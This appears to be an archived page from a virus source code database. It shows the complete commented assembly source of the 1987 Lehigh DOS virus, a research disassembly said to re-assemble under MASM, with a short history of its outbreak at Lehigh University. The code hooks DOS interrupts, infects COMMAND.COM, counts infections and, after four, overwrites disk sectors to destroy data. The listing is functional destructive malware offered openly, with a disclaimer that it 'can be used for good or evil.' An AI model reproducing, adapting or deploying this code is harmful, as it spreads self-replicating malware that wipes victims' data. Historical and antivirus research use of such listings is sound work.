<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: lehigh___asm</title>
<meta name="KEYWORDS" content="lehigh__.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for lehigh__.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="lamark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lamark_asm.php">lamark_asm</a><br>
<a href="lct_599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_599_asm.php">lct_599_asm</a><br>
<a href="lct-599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-599_asm.php">lct-599_asm</a><br>
<a href="lct_762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_762_asm.php">lct_762_asm</a><br>
<a href="lct-762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-762_asm.php">lct-762_asm</a><br>
<a href="leap-fro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leap-fro_asm.php">leap-fro_asm</a><br>
<a href="leapfrog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leapfrog_asm.php">leapfrog_asm</a><br>
<a href="leech__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech__asm.php">leech__asm</a><br>
<a href="leech_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech_asm.php">leech_asm</a><br>
<a href="lehi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehi_asm.php">lehi_asm</a><br>
<a href="lehigh___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh___asm.php">lehigh___asm</a><br>
<a href="lehigh__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh__asm.php">lehigh__asm</a><br>
<a href="lehigh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh_asm.php">lehigh_asm</a><br>
<a href="lep-664a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lep-664a_asm.php">lep-664a_asm</a><br>
<a href="lepmisry_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lepmisry_asm.php">lepmisry_asm</a><br>
<a href="leprosb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosb2_asm.php">leprosb2_asm</a><br>
<a href="leprosy_2_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_2_c.php">leprosy_2_c</a><br>
<a href="leprosy_3_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_3_c.php">leprosy_3_c</a><br>
<a href="leprosy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy__asm.php">leprosy__asm</a><br>
<a href="leprosyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyb_asm.php">leprosyb_asm</a><br>
<a href="leprosy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_c.php">leprosy_c</a><br>
<a href="leprosyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyc_asm.php">leprosyc_asm</a><br>
<a href="leprsyb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb1_asm.php">leprsyb1_asm</a><br>
<a href="leprsyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb_asm.php">leprsyb_asm</a><br>
<a href="leps808d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leps808d_asm.php">leps808d_asm</a><br>
<a href="leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leszop_asm.php">leszop_asm</a><br>
<a href="libertyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/libertyb_asm.php">libertyb_asm</a><br>
<a href="lisa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa__asm.php">lisa__asm</a><br>
<a href="lisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa_asm.php">lisa_asm</a><br>
<a href="lisbon2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisbon2_asm.php">lisbon2_asm</a><br>
<a href="lit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lit_asm.php">lit_asm</a><br>
<a href="littl139_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/littl139_asm.php">littl139_asm</a><br>
<a href="little__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/little__asm.php">little__asm</a><br>
<a href="load_sec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/load_sec_asm.php">load_sec_asm</a><br>
<a href="lock2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock2_asm.php">lock2_asm</a><br>
<a href="lock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock_asm.php">lock_asm</a><br>
<a href="lockjaw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw__asm.php">lockjaw__asm</a><br>
<a href="lockjaw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw_asm.php">lockjaw_asm</a><br>
<a href="lockout2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout2_asm.php">lockout2_asm</a><br>
<a href="lockout_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout_asm.php">lockout_asm</a><br>
<a href="loki1237_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki1237_asm.php">loki1237_asm</a><br>
<a href="loki_973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki_973_asm.php">loki_973_asm</a><br>
<a href="loki-973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki-973_asm.php">loki-973_asm</a><br>
<a href="lokjawd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawd_asm.php">lokjawd_asm</a><br>
<a href="lokjawz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawz_asm.php">lokjawz_asm</a><br>
<a href="lordzero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lordzero_asm.php">lordzero_asm</a><br>
<a href="lqcancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lqcancer_asm.php">lqcancer_asm</a><br>
<a href="ltbro299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro299_asm.php">ltbro299_asm</a><br>
<a href="ltbro307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro307_asm.php">ltbro307_asm</a><br>
<a href="ltbro321_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro321_asm.php">ltbro321_asm</a><br>
<a href="ltbrt299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbrt299_asm.php">ltbrt299_asm</a><br>
<a href="lythyum_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lythyum_asm.php">lythyum_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

        page    65,132
        title   The 'Lehigh' Virus
; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ                 British Computer Virus Research Centre                   บ
; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ
; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ
; บ                                                                          บ
; บ                            The 'Lehigh' Virus                            บ
; บ                Disassembled by Joe Hirst,   July     1989                บ
; บ                                                                          บ
; บ                       Copyright (c) Joe Hirst 1989.                      บ
; บ                                                                          บ
; บ      This listing is only to be made available to virus researchers      บ
; บ                or software writers on a need-to-know basis.              บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

        ; The disassembly has been tested by re-assembly using MASM 5.0.

CODE    SEGMENT BYTE PUBLIC 'CODE'
        ASSUME CS:CODE,DS:CODE

        ; Interrupt 21H routine

BP0010: PUSH    AX
        PUSH    BX
        CMP     AH,4BH                  ; Load function?
        JE      BP0020                  ; Branch if yes
        CMP     AH,4EH                  ; Find file file?
        JE      BP0020                  ; Branch if yes
        JMP     BP0170                  ; Pass interrupt on

        ; Load or find file function

BP0020: MOV     BX,DX                   ; Get pathname pointer
        CMP     BYTE PTR [BX+1],':'     ; Is a disk specified?
        JNE     BP0030                  ; Branch if not
        MOV     AL,[BX]                 ; Get disk letter
        JMP     BP0040

        ; Is there a COMMAND.COM on disk?

BP0030: MOV     AH,19H                  ; Get current disk function
        INT     44H                     ; DOS service (diverted INT 21H)
        ADD     AL,'a'                  ; Convert to letter
BP0040: PUSH    DS
        PUSH    CX
        PUSH    DX
        PUSH    DI
        PUSH    CS                      ; \ Set DS to CS
        POP     DS                      ; /
        MOV     BX,OFFSET PATHNM        ; Address pathname
        MOV     [BX],AL                 ; Store disk letter in pathname
        MOV     DX,BX                   ; Move pathname address
        MOV     AX,3D02H                ; Open handle (R/W) function
        INT     44H                     ; DOS service (diverted INT 21H)
        JNB     BP0050                  ; Branch if no error
        JMP     BP0160                  ; Restore registers and terminate

        ; Is COMMAND.COM infected?

BP0050: MOV     BX,AX                   ; Move file handle
        MOV     AX,4202H                ; Move file pointer function (EOF)
        XOR     CX,CX                   ; \ No offset
        MOV     DX,CX                   ; /
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     DX,AX                   ; Copy file length
        MOV     FILELN,AX               ; Save file length
        SUB     DX,2                    ; Address last word of file
        MOV     AX,4200H                ; Move file pointer function (start)
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     DX,OFFSET BUFFER        ; Address read buffer
        MOV     CX,2                    ; Length to read
        MOV     AH,3FH                  ; Read handle function
        INT     44H                     ; DOS service (diverted INT 21H)
        CMP     WORD PTR BUFFER,65A9H   ; Is file infected?
        JNE     BP0060                  ; Branch if not
        JMP     BP0080

        ; Infect COMMAND.COM

BP0060: XOR     DX,DX                   ; \ No offset
        MOV     CX,DX                   ; /
        MOV     AX,4200H                ; Move file pointer function (start)
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     CX,3                    ; Length to read
        MOV     DX,OFFSET BUFFER        ; Address read buffer
        MOV     DI,DX                   ; Copy address
        MOV     AH,3FH                  ; Read handle function
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     AX,[DI+1]               ; Get displacement from initial jump
        ADD     AX,0103H                ; Convert to address for COM file
        MOV     ENTPTR,AX               ; Save file entry address
        MOV     DX,FILELN               ; Get file length
        SUB     DX,OFFSET ENDADR        ; Subtract length of virus
        DEC     DX                      ; ...and one more
        MOV     [DI],DX                 ; Put offset into jump instruction
        XOR     CX,CX                   ; Clear high offset for move
        MOV     AX,4200H                ; Move file pointer function (start)
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     AL,INFCNT               ; Get infection count
        PUSH    AX                      ; Preserve infection count
        MOV     BYTE PTR INFCNT,0       ; Set infection count to zero
        MOV     CX,OFFSET ENDADR        ; \ Get length of virus
        INC     CX                      ; /
        XOR     DX,DX                   ; Address start of virus
        MOV     AH,40H                  ; Write handle function
        INT     44H                     ; DOS service (diverted INT 21H)
        POP     AX                      ; Recover infection count
        MOV     INFCNT,AL               ; Restore original infection count
        XOR     CX,CX                   ; \ Address second byte of program
        MOV     DX,1                    ; /
        MOV     AX,4200H                ; Move file pointer function (start)
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     AX,[DI]                 ; Get virus offset
        ADD     AX,OFFSET BP0180        ; Add entry point
        SUB     AX,3                    ; Subtract length of jump instruction
        MOV     [DI],AX                 ; Replace offset
        MOV     DX,DI                   ; Address stored offset
        MOV     CX,2                    ; Length to write
        MOV     AH,40H                  ; Write handle function
        INT     44H                     ; DOS service (diverted INT 21H)
        INC     BYTE PTR INFCNT         ; Increment infection count
        CMP     BYTE PTR INFCNT,4       ; Have we reached target?
        JB      BP0070                  ; Branch if not
        JMP     BP0110                  ; Trash disk

        ; Is disk A or B?

BP0070: MOV     BYTE PTR N_AORB,0       ; Set off "not A or B" switch
        CMP     BYTE PTR CURDSK,2       ; Is current disk A or B?
        JB      BP0080                  ; Branch if yes
        MOV     BYTE PTR N_AORB,1       ; Set on "not A or B" switch
BP0080: MOV     AH,3EH                  ; Close handle function
        INT     44H                     ; DOS service (diverted INT 21H)
        CMP     BYTE PTR N_AORB,1       ; Is "not A or B" switch on?
        JE      BP0090                  ; Branch if yes
        JMP     BP0160                  ; Restore registers and terminate

        ; Disk not A or B

BP0090: MOV     BYTE PTR N_AORB,0       ; Set off "not A or B" switch
        MOV     BX,OFFSET PATHNM        ; Address pathname
        MOV     AL,CURDSK               ; Get current disk
        ADD     AL,'a'                  ; Convert to letter
        MOV     [BX],AL                 ; Store letter in pathname
        MOV     DX,BX                   ; Move pathname address
        MOV     AX,3D02H                ; Open handle (R/W) function
        INT     44H                     ; DOS service (diverted INT 21H)
        JNB     BP0100                  ; Branch if no error
        JMP     BP0160                  ; Restore registers and terminate

        ; Set infection count same as in current program

BP0100: MOV     BX,AX
        MOV     AX,4202H                ; Move file pointer function (EOF)
        XOR     CX,CX                   ; \ No offset
        MOV     DX,CX                   ; /
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     DX,AX                   ; \ Address back to infection count
        SUB     DX,7                    ; /
        MOV     AX,4200H                ; Move file pointer function (start)
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     CX,1                    ; Length to write
        MOV     DX,OFFSET INFCNT        ; Address infection count
        MOV     AH,40H                  ; Write handle function
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     AH,3EH                  ; Close handle function
        INT     44H                     ; DOS service (diverted INT 21H)
        JMP     BP0160                  ; Restore registers and terminate

        ; Trash disk

BP0110: MOV     AL,CURDSK               ; Get current disk
        CMP     AL,2                    ; Is disk A or B?
        JNB     BP0150                  ; Branch if not
        MOV     AH,19H                  ; Get current disk function
        INT     44H                     ; DOS service (diverted INT 21H)
        MOV     BX,OFFSET PATHNM        ; Address pathname
        MOV     DL,[BX]                 ; Get drive letter from pathname
        CMP     DL,'A'                  ; Is drive letter 'A'?
        JE      BP0120                  ; Branch if yes
        CMP     DL,'a'                  ; Is drive letter 'a'?
        JE      BP0120                  ; Branch if yes
        CMP     DL,'b'                  ; Is drive letter 'b'?
        JE      BP0130                  ; Branch if yes
        CMP     DL,'B'                  ; Is drive letter 'B'?
        JE      BP0130                  ; Branch if yes
        JMP     BP0160                  ; Restore registers and terminate

        ; Drive A

BP0120: MOV     DL,0                    ; Set drive A
        JMP     BP0140

        ; Drive B

BP0130: MOV     DL,1                    ; Set drive B
BP0140: CMP     AL,DL                   ; Is this the same as current?
        JNE     BP0150                  ; Branch if not
        JMP     BP0160                  ; Restore registers and terminate

        ; Write lump of BIOS to floppy disk

BP0150: MOV     SI,0FE00H               ; \ Address BIOS (?)
        MOV     DS,SI                   ; /
        MOV     CX,0020H                ; Write 32 sectors
        MOV     DX,1                    ; Start at sector one
        INT     26H                     ; Absolute disk write
        POPF
        MOV     AH,9                    ; Display string function
        MOV     DX,1840H
        INT     44H                     ; DOS service (diverted INT 21H)
BP0160: POP     DI
        POP     DX
        POP     CX
        POP     DS
BP0170: POP     BX
        POP     AX
        JMP     CS:INT_21               ; Branch to original Int 21H

        ; Original Int 21H vector

INT_21  EQU     THIS DWORD
        DW      138DH                   ; Int 21H offset
        DW      0295H                   ; Int 21H segment

        ; Entry point for infected program

BP0180: CALL    BP0190                  ; \ Get current address
BP0190: POP     SI                      ; /
        SUB     SI,3                    ; Address back to BP0180
        MOV     BX,SI                   ; \ Address of virus start
        SUB     BX,OFFSET BP0180        ; /
        PUSH    BX                      ; Save address of virus start
        ADD     BX,OFFSET FILELN        ; Address file length
        MOV     AH,19H                  ; Get current disk function
        INT     21H                     ; DOS service
        MOV     [BX-1],AL               ; Save current disk
        MOV     AX,[BX]                 ; Get file length
        ADD     AX,0100H                ; Add PSP length
        MOV     CL,4                    ; \ Convert to paragraphs
        SHR     AX,CL                   ; /
        INC     AX                      ; Allow for remainder
        MOV     BX,AX                   ; Copy paragraphs to keep
        MOV     AH,4AH                  ; Set block function
        INT     21H                     ; DOS service
        JNB     BP0200                  ; Branch if no error
        JMP     BP0220                  ; Pass control to host

        ; Allocate memory for virus

BP0200: MOV     CL,4                    ; Bits to move
        MOV     DX,OFFSET ENDADR        ; Length of virus
        SHR     DX,CL                   ; Convert to paragraphs
        INC     DX                      ; Allow for remainder
        MOV     BX,DX                   ; Copy paragraphs for virus
        MOV     AH,48H                  ; Allocate memory function
        INT     21H                     ; DOS service
        JNB     BP0210                  ; Branch if no error
        JMP     BP0220                  ; Pass control to host

        ; Install virus in memory

BP0210: PUSH    ES
        PUSH    AX                      ; Preserve allocated memory segment
        MOV     AX,3521H                ; Get Int 21H function
        INT     21H                     ; DOS service
        MOV     [SI-4],BX               ; Save Int 21H offset
        MOV     [SI-2],ES               ; Save Int 21H segment
        POP     ES                      ; Recover allocated memory segment
        PUSH    SI
        SUB     SI,OFFSET BP0180        ; Address back to start of virus
        XOR     DI,DI                   ; Target start of new area
        MOV     CX,OFFSET ENDADR        ; \ Length of virus
        INC     CX                      ; /
        REPZ    MOVSB                   ; Copy virus to new area
        POP     SI
        PUSH    DS
        MOV     DX,[SI-4]               ; Get Int 21H offset
        MOV     AX,[SI-2]               ; \ Set DS to Int 21H segment
        MOV     DS,AX                   ; /
        MOV     AX,2544H                ; Set Int 44H function
        INT     21H                     ; DOS service
        PUSH    ES                      ; \ Set DS to ES
        POP     DS                      ; /
        XOR     DX,DX                   ; Interrupt 21H routine (BP0010)
        MOV     AX,2521H                ; Set Int 21H function
        INT     44H                     ; DOS service (diverted INT 21H)
        POP     DS
        POP     ES
BP0220: POP     BX
        PUSH    ENTPTR[BX]              ; Push COM file entry address
        RET                             ; ...and return to it

PATHNM  DB      'b:\command.com', 0     ; Pathname
BUFFER  DB      7FH, 58H, 0BH, 0, 0     ; Read buffer
ENTPTR  DW      0CB0H                   ; File entry address
N_AORB  DB      0                       ; "Not A or B" switch
INFCNT  DB      0                       ; Infection count
        DB      0
CURDSK  DB      0                       ; Current disk
FILELN  DW      5AAAH                   ; File length
        DW      65A9H                   ; Infection indicator

ENDADR  EQU     $-1

CODE    ENDS

        END
</textarea>
<p>
This PC system infector is a short-life virus, activating after it has achieved
only four infections.  Like other short-life viruses, it has a high probability
of activating and destroying data before there is any indication that the virus
is present.  On the positive side, it is very slow to spread since it does not 
allow time to infect vast numbers of diskettes.
<p>
The Lehigh virus is named after <a href="javascript:if(confirm('http://www.lehigh.edu/  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.lehigh.edu/'" tppabs="http://www.lehigh.edu/">Lehigh University</a> in Bethlehem, Pennsylvania, 
where it infected a number of systems in 1987 belong to both staff and students
and caused data destruction in laboratory micros.  It infected the system 
command interpreter--COMMAND.COM--and used operating system commands as a 
channel for replicating itself.  It infected all system diskettes (diskettes 
containging operating system files) inserted into the system and after the 
fourth infection it destroyed all data on the hard disk.

</td></tr></table></body></html>
